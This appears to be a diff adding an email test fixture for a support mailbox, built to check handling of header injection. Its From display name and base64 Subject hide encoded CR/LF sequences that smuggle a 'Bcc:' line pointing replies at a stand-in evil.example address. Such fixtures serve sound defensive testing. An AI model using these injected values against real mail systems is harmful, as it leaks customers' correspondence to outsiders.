@@ -1,0 +1,11 @@
+X-Fixture-Purpose: encoded CR/LF in Subject and From display name attempting header injection into replies
+From: =?utf-8?Q?Eve=0D=0ABcc:_attacker@evil.example?= <eve@evil.example>
+To: Acme Support <support@acme.example>
+Subject: =?utf-8?B?SGVscA0KQmNjOiB2aWN0aW1AZXZpbC5leGFtcGxl?=
+Date: Tue, 22 Sep 2026 10:15:00 +0000
+Message-ID: <inject-0001@mail.customer.example>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+Header injection attempt.
